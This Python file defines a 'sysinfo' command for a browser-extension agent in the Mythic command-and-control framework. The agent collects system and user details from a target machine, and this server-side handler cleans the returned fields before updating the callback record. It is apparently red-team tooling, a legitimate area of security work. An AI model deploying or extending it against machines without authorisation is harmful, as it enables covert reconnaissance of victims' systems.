import json

from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments,
    MythicTask, PTTaskMessageAllData,
    PTTaskProcessResponseMessageResponse, CommandAttributes,
)


class SysinfoArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class SysinfoCommand(CommandBase):
    cmd            = "sysinfo"
    needs_admin    = False
    help_cmd       = "sysinfo"
    description    = (
        "Gather browser extension info, Chrome profile, platform OS/arch, and navigator env. "
        "If ip_proxy_start has been run with a native host build, also collects real hostname, "
        "OS user, local IP and updates the callback display row automatically."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = SysinfoArguments
    parameters     = []
    attackmapping  = ["T1082", "T1614"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = ""
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        # If the agent sent structured native host data, update the callback row directly
        # via Mythic RPC — more reliable than callback_info in post_response.
        try:
            data = response if isinstance(response, dict) else json.loads(response)
            if not isinstance(data, dict) or "native_host" not in data:
                return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)

            # Sanitize all fields before writing to the Mythic database.
            # Data originates from the target machine so treat it as untrusted:
            # enforce string type, strip null bytes / control characters, cap length.
            def _clean(val: any, max_len: int = 255) -> str:
                s = val if isinstance(val, str) else str(val)
                # Remove null bytes and non-printable control characters (keep tab/LF/CR)
                s = "".join(c for c in s if c == "\t" or c >= " ")
                return s[:max_len]

            host = _clean(data.get("native_host", ""))
            user = _clean(data.get("native_user", ""))
            os_  = _clean(data.get("native_os",   ""))
            arch = _clean(data.get("native_arch",  ""), 16)
            ip   = _clean(data.get("native_ip",    ""), 45)   # max IPv6 length

            # Reject clearly bogus values (empty host means the agent sent garbage)
            if not host:
                return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)

            from mythic_container.MythicRPC import MythicRPC, MythicRPCCallbackUpdateMessage
            await MythicRPC().execute(MythicRPCCallbackUpdateMessage(
                CallbackID   = task.Task.CallbackID,
                Host         = host,
                User         = user,
                OS           = os_,
                Architecture = arch,
                ExtraInfo    = f"local_ip={ip}",
            ))
        except Exception:
            pass  # graceful fallback — task output still shows the data

        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
